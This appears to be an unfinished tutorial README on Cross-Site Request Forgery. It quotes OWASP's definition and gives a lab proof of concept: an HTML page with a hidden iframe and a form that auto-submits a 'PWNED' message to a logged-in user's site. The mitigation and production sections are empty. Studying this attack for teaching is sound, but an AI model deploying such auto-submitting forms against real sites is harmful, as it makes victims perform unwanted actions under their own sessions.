# Cross Site Request Forgery

&nbsp;

## Overview
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

Source: https://owasp.org/www-community/attacks/csrf

&nbsp;

## Folders
1. **[CSRF🖊️](../src/CSRF.md)**

&nbsp;

## Setup For Simulating Attack

This a POC attack that will work since both our
`localhost.charles.com` and `evil.com` site are on the same domain.

We will trick the user on `evil.com` to submit a form action on click of a link
that will contain a message posted to `localhost.charles.com`.

We will exploit there authenticated state and use take advantage of the user's
cookie to execute an unknown action posting a message on their behalf.

&nbsp;

```html
<div id="hide"><iframe name="hiddenFrame"></iframe></div>

<form id="theform"
      action="https://localhost.charlesproxy.com/"
      method="post"
      target="hiddenFrame">
  <label for="message">Message:</label><br>
  <textarea name="message">PWNED</textarea><br>
  <input type="submit">
</form>
<script>
  theform.submit()
</script>
```

## Setup For Mitigating Attack


&nbsp;

## Production Level Solution



